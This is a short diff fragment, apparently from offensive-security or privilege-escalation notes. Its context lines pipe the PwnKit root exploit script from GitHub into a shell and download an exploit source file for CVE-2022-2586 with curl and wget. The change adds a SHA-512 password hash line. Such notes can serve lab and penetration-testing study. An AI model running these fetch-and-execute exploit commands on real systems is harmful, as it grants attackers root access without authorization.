@@ -233,4 +233,4 @@ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
 curl -o exploit.c https://raw.githubusercontent.com/whatever/exploit/CVE-2022-2586.c
 wget -O exploit.c https://raw.githubusercontent.com/whatever/exploit/CVE-2022-2586.c
 
-
+$6$3c/stP2hxnireZRa$8Byaa52GnSq5BEVJtCrh2ZAKNSzYRvFuDEb2q2jk8hsJH91qQ6zgtUCxAZ.NgssBCJ7I8DURme/kd7MSkNl5f/
